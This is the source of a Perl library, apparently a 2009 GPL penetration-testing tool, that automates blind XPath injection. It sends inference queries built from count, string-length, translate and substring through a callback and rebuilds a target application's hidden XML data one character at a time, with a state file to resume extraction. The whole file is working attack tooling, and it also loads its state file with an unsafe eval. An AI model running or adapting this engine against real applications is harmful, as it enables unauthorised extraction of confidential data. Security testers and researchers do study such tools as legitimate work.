# Blind XPath Injection Library
# Original concept : Amit Klein (http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf)
#
# Copyright 2009 Laurent Licour <laurent -at- licour -dot- com>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
# v1.0 02/06/2009  Original code
#


use strict;
use Data::Dumper;
use Getopt::Long;
use XML::XPath;

package BlindXPath;

my $Version = "1.0";

# Command line default parameters
my $ArgNoComments = 0;		# parse comments
my $ArgNoNodeTexts = 0;		# parse node values
my $ArgNoPIs = 0;		# parse processing instructions
my $ArgNoAttrNames = 0;		# parse attr names
my $ArgNoAttrValues = 0;	# parse attr values
my $ArgNoNodeNames = 0;		# parse node names
my $ArgNodeDepth = 0;		# infinite recurse
my $ArgNodeStart = "";		# starting node
my $ArgOutputFile;		# output file
my $ArgStateFile;		# output State File 
my $ArgNoReadStateFile = 0;	# read state file before processing
my $ArgDebug = 0;		# debug Mode
my $ArgHelp = 0;		# Help

my $TYPE_TEXT    = 1;
my $TYPE_COMMENT = 2;
my $TYPE_ELEMENT = 3;
my $TYPE_PI      = 4;

my $UNEXPECTED_CHAR = chr(31);

my $OutputFile;

my $cpt = 0;
my $debug = 0;

# Keep trace of all nodnames and argnames, and try to use them after during node identification
my %RECORDED_NAMES;
my %RECORDED_ARGS;

# Keep state of currents request to save/restore
my %STATE;


###############################################################
# Query call
###############################################################
sub query
{
  my ($req) = (@_);

  $cpt++;

  my $res = callback_blind_xpath($req);
  
  display_debug("#$cpt#$req#$res#\n") if ($debug);

  return $res;
}

###############################################################
# Test if int is lower than number express in 2^nbit
###############################################################
sub is_int_lt_nbit
{
  my ($req, $bit) = @_;

  my $new="($req < " . sprintf("%d", 2**$bit) . ")";
  my $res = query($new);
  return $res;
}


################################
# Identify integer
# try to optimize requests
################################
sub calc_integer
{
  my ($req) = @_;

  # Identifiy length class to minimize requests
  my $nbit;
  if (is_int_lt_nbit($req, 4)) {
    $nbit = 4;
  }
  elsif (is_int_lt_nbit($req, 8)) {
    $nbit = 8;
  }
  elsif (is_int_lt_nbit($req, 16)) {
    $nbit = 16;
  }
  elsif (is_int_lt_nbit($req, 24)) {
    $nbit = 24;
  }
  elsif (is_int_lt_nbit($req, 32)) {
    $nbit = 32;
  }
  else {
    display_error("Error: length overflow. XPath:$req\n");
    exit(1);
  }

  # Calculate length (xpath does not include bit masking with logical and, so we use another algo)
  my $i;
  my $int = 0;
  for ($i=$nbit-1; $i>=0; $i--)
  {
    my $new="($req - " . $int . " >= " . sprintf("%d", 2**$i) . ")";
    $int += (2**$i) if query($new);
  }

  return $int;
}

################################
# Identify number of nodes of expression
################################
sub count_nodes
{
  my ($req) = @_;

  # count number of nodes of the expression
  my $lreq = "count($req)";

  return calc_integer($lreq);
}

################################
# Identify length of expression
################################
sub strlen_exp
{
  my ($req) = @_;

  # identify length of the expression
  my $lreq = "string-length($req)";

  return calc_integer($lreq);
}

###############################################################"
# As XPath 1.0 does not support evoluated function, try
# to create regexp-like functionnality
# If the searched char is in range, it will be replace with
# the UNEXPECTED Char
###############################################################"
sub test_char_in_range
{
  my ($req, $range) = @_;

  my $mask = $UNEXPECTED_CHAR x length($range);
  my $new="translate($req, \"$range\", \"$mask\") = \"$UNEXPECTED_CHAR\"";

  return query($new);
}

#############################################################
# Try to isolate string search into smaller pieces
# to reduce number of requests
#############################################################
sub get_char_in_range
{
  my ($req, $range) = @_;

  return if (!test_char_in_range($req, $range));

  # do not split range into smallest piece
  if (length($range) <= 6) {
    return parse_char_in_range($req, $range);
  }
  # split range into 2 pieces
  elsif (length($range) <= 10) {
    my $s1 = substr($range, 0, length($range)/2);
    my $s2 = substr($range, length($range)/2);

    if (test_char_in_range($req, $s1)) {
      return parse_char_in_range($req, $s1);
    }
    else {
      return parse_char_in_range($req, $s2);
    }
  }
  # split range into 4 pieces
  else {
    my $s1 = substr($range, 0, length($range)/2);
    my $s2 = substr($range, length($range)/2);

    if (test_char_in_range($req, $s1)) {
      my $ss1 = substr($s1, 0, length($s1)/2);
      my $ss2 = substr($s1, length($s1)/2);

      if (test_char_in_range($req, $ss1)) {
        return parse_char_in_range($req, $ss1);
      }
      else {
        return parse_char_in_range($req, $ss2);
      }
    }
    else {
      my $ss1 = substr($s2, 0, length($s2)/2);
      my $ss2 = substr($s2, length($s2)/2);

      if (test_char_in_range($req, $ss1)) {
        return parse_char_in_range($req, $ss1);
      }
      else {
        return parse_char_in_range($req, $ss2);
      }
    }
  }
}

###############################################
# Parse string to identify char
#  not optimized but necessary for some chars (CR, HT)
###############################################
sub parse_char_in_range
{
  my ($req, $range) = @_;

  for (my $i=0; $i<length($range); $i++)
  {
    my $car=substr($range,$i,1);
    my $new;
    if (ord($car) >= 32) {
      $new="$req='$car'";
    }
    else {
      $new="contains($req,'$car')";
    }
    return ord($car) if (query($new));
  }

  return;
}

###############################################
# Obtain char
# Could be optimize to reduce requests
###############################################
sub calc_char
{
  my ($req) = @_;

  my $str;
  my $car;

  $str = "abcdefghijklmnopqrstuvwxyz";
  $car = get_char_in_range($req, $str);
  return($car) if ($car);

  $str = "0123456789";
  $car = get_char_in_range($req, $str);
  return($car) if ($car);

  $str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  $car = get_char_in_range($req, $str);
  return($car) if ($car);

  # Seems that following char are not reconized with some Xpath implementations
  #   < % +
  $str = ' !#$()*,-.:;=>?@[\]^_{|}~';
  $car = get_char_in_range($req, $str);
  return($car) if ($car);

  $str = chr(0x09) . chr(0x0A); # HT & LF
  $car = parse_char_in_range($req, $str);
  return($car) if ($car);

  # Last chance : parse all chars
  for(my $i=0; $i<=255; $i++) {
    next if (chr($i) =~ /[a-zA-Z0-9]/);
    $car = parse_char_in_range($req, chr($i));
    return($car) if ($car);
  }

  # Unable to identify char. return default one
  display_error("Error: char not found in any range. xpath : $req\n");
  return ord("?");
}

###############################################
# Obtain string
# We had to comput it char by char
###############################################
sub calc_string
{
  my ($req) = @_;

  # First, get length of the string
  my $lg = strlen_exp($req);

  # iterate for each char
  my $str = "";
  for (my $offset=1; $offset<=$lg; $offset++)
  {
    my $new = "substring($req, $offset, 1)";
    my $car = calc_char($new);
    
    $str .= chr($car);
  }

  return $str;
}

#################################################
# Identify attribute name
# Use caching to optimize requests
#################################################
sub get_attribute_name
{
  my ($req, $pos) = @_;

  my $req = $req . "[position()=$pos]";

  my $name;

  # Lookup into cache. Cache is sorted by frequency
  foreach my $n (sort { $RECORDED_ARGS{$a} <=> $RECORDED_ARGS{$b} } keys %RECORDED_ARGS) {
    my $new = "name($req) = '$n'";
    if (query($new)) {
      $RECORDED_ARGS{$n}++;
      $name = $n;
      last;
    }
  }

  # Does not found in cache
  if (! defined($name)) {
    $name = calc_string("name($req)");
    $RECORDED_ARGS{$name} = 1;
  }

  return $name;
}

#################################################
# Identify attribute value
# Use caching to optimize requests
#################################################
sub get_attribute_value
{
  my ($req, $pos) = @_;

  my $req = $req . "[position()=$pos]";

  my $value = calc_string($req);

  return $value;
}


#########################################################
# Obtain attributes of a node
#   - get nb of attribute
#   - get name and value of each attribute
#########################################################
sub get_attributes
{
  my ($state, $req) = @_;

  my $req = "$req/attribute::*";

  # Identify how many attributes (from cache or compute)
  my $nbatt;
  if (defined($state->{"nbatt"})) {
    $nbatt = $state->{"nbatt"};
  }
  else {
    $nbatt = count_nodes($req);
    $state->{"nbatt"} = $nbatt;
  }

  # iteration for each attribute
  my $data = "";
  for (my $i=1; $i<=$nbatt; $i++)
  {
    # get attribiute name (from cache or compute)
    my $attname;
    if (defined($state->{"attname$i"})) {
      $attname = $state->{"attname$i"};
    }
    else {
      if (! $ArgNoAttrNames) {
        $attname = get_attribute_name($req, $i);
        $state->{"attname$i"} = $attname;
      }
      else {
        $attname = "?";
      }
    }

    # get attribiute value (from cache or compute)
    my $attvalue;
    if (defined($state->{"attvalue$i"})) {
      $attvalue = $state->{"attvalue$i"};
    }
    else {
      if (! $ArgNoAttrValues) {
        $attvalue = get_attribute_value($req, $i);
        $state->{"attvalue$i"} = $attvalue;
      }
      else {
        $attvalue = "?";
      }
    }

    $data .= " $attname=\"$attvalue\"";
  }

  return $data;
}

#####################################
# Get texts
#####################################
sub get_texts {
  my ($state, $req) = @_;

  # data is already computed
  return @{$state->{"text"}} if (defined($state->{"text"}));

  my $req = "$req/child::text()";

  # Identify how many text (from cache or compute)
  my $nbtext;
  if (defined($state->{"nbtext"})) {
    $nbtext = $state->{"nbtext"};
  }
  else {
    $nbtext = count_nodes($req);
    $state->{"nbtext"} = $nbtext;
  }
 
  my @data;
  # Do not compute 
  if ($ArgNoNodeTexts) {
    for (my $i=1; $i<=$nbtext; $i++)
    {
      push @data, "?";
    }
    return @data;
  }

  # Compute data
  for (my $i=1; $i<=$nbtext; $i++)
  {
    my $new = $req . "[position()=$i]";
    my $value = calc_string($new);

    push @data, $value;
  }
  $state->{"text"} = \@data;

  return @data;
}

#####################################
# Get comments
#####################################
sub get_comments {
  my ($state, $req) = @_;

  # data is already computed
  return @{$state->{"comment"}} if (defined($state->{"comment"}));

  my $req = "$req/child::comment()";
 
  # Identify how many text (from cache or compute)
  my $nbcomment;
  if (defined($state->{"nbcomment"})) {
    $nbcomment = $state->{"nbcomment"};
  }
  else {
    $nbcomment = count_nodes($req);
    $state->{"nbcomment"} = $nbcomment;
  }
 
  my @data;
  # Do not compute 
  if ($ArgNoComments) {
    for (my $i=1; $i<=$nbcomment; $i++)
    {
      push @data, "?";
    }
    return @data;
  }

  # Compute data
  for (my $i=1; $i<=$nbcomment; $i++)
  {
    my $new = $req . "[position()=$i]";
    my $value = calc_string($new);

    push @data, $value;
  }
  $state->{"comment"} = \@data;

  return @data;
}

#####################################
# Get Elements
#  not fetch them, just count them
#####################################
sub get_elements {
  my ($state, $req) = @_;

  # data is already computed
  return @{$state->{"element"}} if (defined($state->{"element"}));

  my $req = "$req/child::*";

  # Identify how many element (from cache or compute)
  my $nbelement;
  if (defined($state->{"nbelement"})) {
    $nbelement = $state->{"nbelement"};
  }
  else {
    $nbelement = count_nodes($req);
    $state->{"nbelement"} = $nbelement;
  }
 
  my @data;
  # Compute data
  for (my $i=1; $i<=$nbelement; $i++)
  {
    push @data, 1;
  }
  $state->{"element"} = \@data;

  return @data;
}

#####################################
# Get processing instructions
#####################################
sub get_pis {
  my ($state, $req) = @_;

  # data is already computed
  return @{$state->{"pi"}} if (defined($state->{"pi"}));

  my $req = "$req/child::processing-instruction()";

  # Identify how many pi (from cache or compute)
  my $nbpi;
  if (defined($state->{"nbpi"})) {
    $nbpi = $state->{"nbpi"};
  }
  else {
    $nbpi = count_nodes($req);
    $state->{"nbpi"} = $nbpi;
  }

  my @data;
  # Do not compute 
  if ($ArgNoPIs) {
    for (my $i=1; $i<=$nbpi; $i++)
    {
      push @data, "?";
    }
    return @data;
  }

  # Compute data
  for (my $i=1; $i<=$nbpi; $i++)
  {
    my $new = $req . "[position()=$i]";
    my $name = calc_string("name($new)");
    my $value = calc_string($new);
    push @data, "$name $value";
  }
  $state->{"pi"} = \@data;

  return @data;
}

##########################################
# Identify type of node's childs 
# Try to count number of nodes. If this is 
# the same node, result is 1
# (see original white paper)
##########################################
sub get_child_order
{
  my ($req, $nb_text, $nb_comment, $nb_elt, $nb_pi) = @_;

  my $ntext = 0;
  my $ncomment = 0;
  my $nelt = 0;
  my $npi = 0;
  my @order;
   
  my $nb = $nb_text + $nb_comment + $nb_elt + $nb_pi;
  for (my $i=0; $i<$nb; $i++) {
    my $rtext    = "count($req/child::node()[position() = " . ($ntext+$ncomment+$nelt+$npi+1) . "] | $req/child::text()[position() = " . ($ntext+1) . "]) = 1";
    my $rcomment = "count($req/child::node()[position() = " . ($ntext+$ncomment+$nelt+$npi+1) . "] | $req/child::comment()[position() = " . ($ncomment+1) . "]) = 1";
    my $relt     = "count($req/child::node()[position() = " . ($ntext+$ncomment+$nelt+$npi+1) . "] | $req/child::*[position() = " . ($nelt+1) . "]) = 1";
    my $rpi      = "count($req/child::node()[position() = " . ($ntext+$ncomment+$nelt+$npi+1) . "] | $req/child::processing-instruction()[position() = " . ($npi+1) . "]) = 1";

    if ($nb_text != 0 && query($rtext)) {
      $ntext++;
      push @order, $TYPE_TEXT;
    }
    elsif ($nb_elt != 0 && query($relt)) {
      $nelt++;
      push @order, $TYPE_ELEMENT;
    }
    elsif ($nb_comment != 0 && query($rcomment)) {
      $ncomment++;
      push @order, $TYPE_COMMENT;
    }
    elsif ($nb_pi != 0 && query($rpi)) {
      $npi++;
      push @order, $TYPE_PI;
    }
    else {
      display_error("Error : Unknow child type\n");
      display_error("req       : $req\n");
      display_error("child num : $i\n");
      exit 1;
    }
  }

  return(@order);
}

#################################################
# Identify Nodename
# Use caching to optimize requests
#################################################
sub get_nodename
{
  my ($req) = @_;

  my $req = "name($req)";

  my $name;

  # Lookup into cache. Cache is sorted by frequency
  foreach my $n (sort { $RECORDED_NAMES{$a} <=> $RECORDED_NAMES{$b} } keys %RECORDED_NAMES) {
    my $new = "$req = '$n'";
    if (query($new)) {
      $RECORDED_NAMES{$n}++;
      $name = $n;
      last;
    }
  }

  $name = calc_string($req);
  $RECORDED_NAMES{$name} = 1;

  return($name);
}

###################################
# Display error
###################################
sub display_error
{
  my ($str) = @_;

  print STDERR $str;
}

###################################
# Display debug
###################################
sub display_debug
{
  my ($str) = @_;

  print STDERR $str;
}

###################################
# Display XML
###################################
sub display
{
  my ($str) = @_;

  $| =1;

  if (! defined($OutputFile) && $ArgOutputFile) {
    if (! open($OutputFile, "> $ArgOutputFile")) {
      display_error("Error : Unable to write into $ArgOutputFile");
      exit(1);
    }
  }

  if (defined $OutputFile) {
    print $OutputFile "$str";
  }

  print "$str";

  # Save State file
  #$Data::Dumper::Indent = 0;
  if (! open(STATE, ">$ArgStateFile")) {
    display_error("Error : Unable to write to state file $ArgStateFile");
    exit(1);
  }
  print STATE Dumper(\%STATE);
  close(STATE);
}

###################################
# Get element at position 'pos'
###################################
sub get_elt
{
  my ($req, $pos, $depth) = @_;

  my $key = "$pos#$depth#$req";

  # Is the restored slot match the current request
  #my $rmatch = 0;
#  my $rref;
  if (! defined $STATE{$key}) {
  #  if ( ($rref->{"req"} eq $req) && ($rref->{"pos"} eq $pos) && ($rref->{"depth"} eq $depth) ) {
  #    $rmatch = 1;
  #  }
    my %ref;
    $STATE{$key} = \%ref;

    $ref{"req"} = $req;
    $ref{"pos"} = $pos;
    $ref{"depth"} = $depth;
  }
  my $state = $STATE{$key};


  # Identify element 
  $req = $req . "[position()=$pos]";

#  if ($rref && defined($rref->{"name"})) {
#    $name = $rref->{"name"};
#  }
#  else {
#    $name = get_nodename($req);
#  }
#  $ref{"name"} = $name;

  # Get nodename & attributes
  # Read nodename from state file or process it
  my $name;
  if (defined($state->{"name"})) {
    $name = $state->{"name"};
  }
  else {
    if (! $ArgNoNodeNames) {
      $name = get_nodename($req);
      $state->{"name"} = $name;
    }
    else {
      $name = "?";
    }
  }

  # Read attribute from state file or process it
  my $att = get_attributes($state, $req);
  display("<$name$att>");

  # Read text from state file or process it
  my @text = get_texts($state, $req);

  # get comments
  my @comment = get_comments($state, $req);

  # get elements
  my @element = get_elements($state, $req);

  # get PIs
  my @pi = get_pis($state, $req);
 
  # get order
  my @order;
  if (defined($state->{"order"})) {
    @order = @{$state->{"order"}};
  }
  else {
    @order = get_child_order($req, $#text+1, $#comment+1, $#element+1, $#pi+1);
  }
#  $ref{"order"} = \@order;

  for (my $i=0; $i<$#order + 1; $i++) {
    if ($order[$i] == $TYPE_TEXT) {
      my $v = shift @text;
      display($v);
    }
    if ($order[$i] == $TYPE_COMMENT) {
      my $v = shift @comment;
      display("<!-- $v -->");
    }
    if ($order[$i] == $TYPE_PI) {
      my $v = shift @pi;
      display("<?$v?>");
    }
    # now, recurse into current element
    if ($order[$i] == $TYPE_ELEMENT) {
      # ArgNodeDepth == 0 : infinite recurse
      # otherwise, we lookup if we can recurse
      if ($ArgNodeDepth > $depth || $ArgNodeDepth == 0) {
        my $new = $req . "/node()";
        get_elt($new, $i+1, $depth+1);
      }
    }
  }

  # Close current element
  display("</$name>");

#  pop @STATE;
  return($name);
}

sub ReadStateFile {
  if (! open(STATE, $ArgStateFile)) {
    display_debug("Unable to read state file : $ArgStateFile. Skip it\n");
    return;
  }
  display_debug("Using state file : $ArgStateFile\n");
  my $state;
  my $VAR1;
  while(<STATE>) {
    $state .= $_;
  }
  close(STATE);
  %STATE = %{ eval $state; };
}

#####################################################################
## Options de lancement
######################################################################
sub usage {
  print "blind-xpath-lib.pm [v$Version]\n";
  print "Options\n";
  print "  -c       (Do not retreive comments)\n";
  print "  -t       (Do not retreive texts)\n";
  print "  -p       (Do not retreive processing instructions)\n";
  print "  -a       (Do not retreive argument's names)\n";
  print "  -A       (Do not retreive argument's values)\n";
  print "  -n       (Do not retreive node's names)\n";
  print "  -d <0-n> (depth of XML analyse. Default:0 (=infinite) )\n";
  print "  -s xpath (define the starting node. Default : /node() )\n";
  print "  -o file  (Write output into file. Default : stdout )\n";
  print "  -D       (debug mode)\n";
  print "  -h       (help)\n";
  exit 1;
}


##############################################
# Entry point of library
##############################################
sub blind_xpath_start {

Getopt::Long::Configure ("bundling");
  Getopt::Long::GetOptions(
    "c" => \$ArgNoComments,
    "t" => \$ArgNoNodeTexts,
    "p" => \$ArgNoPIs,
    "a" => \$ArgNoAttrNames,
    "A" => \$ArgNoAttrValues,
    "n" => \$ArgNoNodeNames,
    "d=i" => \$ArgNodeDepth,
    "s=s" => \$ArgNodeStart,
    "o=s" => \$ArgOutputFile,
    "R" => \$ArgNoReadStateFile,
    "w=s" => \$ArgStateFile,
    "D" => \$ArgDebug,
    "h" => \$ArgHelp,
  ) or usage();

  usage() if ($ArgHelp);
  usage() if (! $ArgOutputFile);
  $debug=1 if ($ArgDebug);

  $ArgStateFile = "$ArgOutputFile.state" if (! defined $ArgStateFile);

  ReadStateFile() if (!$ArgNoReadStateFile);

  if ($ArgNodeStart eq "") {
    my $req="/node()";
    get_elt($req, 1, 1);
  }
  else {
    # First, try to define if xpath expression given is valid
    my $xml = XML::XPath->new(xml => "<test/>");
    eval {
      my $res = $xml->find($ArgNodeStart);
    };
    if ($@) {
      display_error("Error : Seems that this is not a valid XPath Expression : $ArgNodeStart\n");
      exit(1);
    }

    # Count how many nodes
    my $nb=count_nodes($ArgNodeStart);
    if ($nb == 0) {
      print "Error : There is no node for this XPath Expression : $ArgNodeStart\n";
    }
    else {
      print "Found $nb node(s) for this XPath Expression : $ArgNodeStart\n\n";
      for (my $i=1; $i <= $nb; $i++) {
        get_elt($ArgNodeStart, $i, 1);
      }
    } 
  }

  print "\n\nFinshed using $cpt requests\n";

}

1;

